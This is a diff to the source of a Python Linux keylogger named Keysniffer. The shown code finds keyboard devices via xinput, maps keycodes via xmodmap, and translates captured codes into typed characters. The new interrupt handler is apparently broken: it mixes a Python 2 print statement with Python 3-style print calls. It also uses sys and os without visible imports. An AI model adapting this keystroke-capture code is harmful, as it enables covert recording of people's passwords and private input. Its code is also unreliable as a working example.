@@ -20,25 +20,26 @@ class Keysniffer():
 		# Exec 'xinput list' to get available input devices
 		try:
 			xinput_list = subprocess.Popen((self.xinput, 'list'), 
-							stdout=subprocess.PIPE,
-							universal_newlines=True)
+											stdout=subprocess.PIPE,
+											universal_newlines=True)
 		except OSError as err:
 			print('[Error]: {}'.format(err))
 		
 		dev_ids = []
 		for line in xinput_list.stdout:
+			#  AT should be in the id line for standard keyboards on Linux
 			if "AT" in line:
 				l_split = str(line).split()
-				find_id = re.compile('id=([0-9])')      # regex for id string
+				
+				# regex for id string
+				find_id = re.compile('id=([0-9])')
 				for word in l_split:
 					if find_id.match(word):
-						# append the last character, which should be
-						# the numeric device ID.
 						dev_ids.append(str(word).split('=')[-1])
 					else:
-						pass
+						continue
 			else:
-				pass
+				continue
 
 		# If dev_ids has less than 1 value, no keyboard devices were found
 		if len(dev_ids) < 1: 
@@ -50,47 +51,43 @@ class Keysniffer():
 
 	def getKeyCodes(self):
 		"""
-		Get keycode map using xmodmap and use codes as keys in a dict.
+		Get keycode map using xmodmap and use the numeric codes as keys in a dictionary.
 		"""
-		# Call xmodmap to get keycode mapping, pipe to stdout
+		# Call xmodmap to get keycode mapping, pipe stdout
 		modmap_out = subprocess.Popen(('xmodmap', '-pm', '-pk'), 
-			stdout=subprocess.PIPE,
-			universal_newlines=True)
+										stdout=subprocess.PIPE,
+										universal_newlines=True)
 
 		# Iterate through output of xmodmap by line, split line into its items,
-		# and append that each list of items to codes[] list
-		codes = []
+		# and append that list of items to codes[]
+		kcodes = []
 		for line in modmap_out.stdout:
-			codes.append(str(line).strip().split())
+			kcodes.append(str(line).strip().split())
 
-		# Iterate through the resulting keycode list items
-		for line in codes:
+		# Iterate through the resulting keycode list
+		for line in kcodes:
 			# Ignore lines with fewer than 2 values (each key from 
 			# xmodmap out has min. of 3 values [code, hex, key])
 			if len(line) < 2:
 				pass
 			else:
-				c1 = str(line[0])
 				# if first item is numeric, its a keycode
+				c1 = str(line[0])
 				if c1.isnumeric():
-					# more than 4 items means there are 2 key values;
-					# keep both.      
+					# more than 4 items means there are 2 key values; keep both.      
 					if len(line) > 4: 
 						code_str = [c1, line[2], line[4]]
 					else: 
 						code_str = [c1, line[2]]
 					
-					# fill self.keycodes list with resulting list items.
-					# resulting items will have values in order
-					# [code, val1, val2]
+					# fill self.keycodes with resulting list items.
+					# format: [code, val1, val2]
 					self.keycodes.append(code_str)
 
 
 	def findKey(self, code):
 		"""
-		Go through each code string in keycodes map looking for the matching code.
-		If the value at the matching code is a normal character, returns the stripped 
-		literal character. If the value of the code is Space, return a whitespace string.
+		Match a keycode to it's corresponding key
 		"""
 		for line in self.keycodes:
 			# select line with matching code
@@ -98,7 +95,7 @@ class Keysniffer():
 				# alphanumeric chars will have a len of 3 since there are
 				# in the format '(x)' at index [1] of the keycode line
 				if len(line[1]) == 3:
-					return line[1]
+					return line[1][1]
 				elif line[1] == '(Space)':
 					return ' '
 				# if line[1] is greater than 3, it is a special key or 
@@ -106,7 +103,7 @@ class Keysniffer():
 				# TODO: implement function to convert basic special key/chars
 				# key values to their literal representations 
 				elif len(line[1]) > 3:
-					pass
+					return line[1][1:-1]
 			else:
 				continue
 
@@ -120,7 +117,6 @@ class Keysniffer():
 		for code in in_buffer:
 			if str(code).isnumeric():
 				out_buffer.append(self.findKey(code))
-
 		return out_buffer
 		
        
@@ -185,5 +181,13 @@ def main():
 	ks = Keysniffer()
 	ks.keySniff()
 
-main()
+if __name__ == '__main__':
+    try:
+        main()
+    except KeyboardInterrupt:
+        print 'Interrupted'
+        try:
+            sys.exit(0)
+        except SystemExit:
+            os._exit(0)
 	
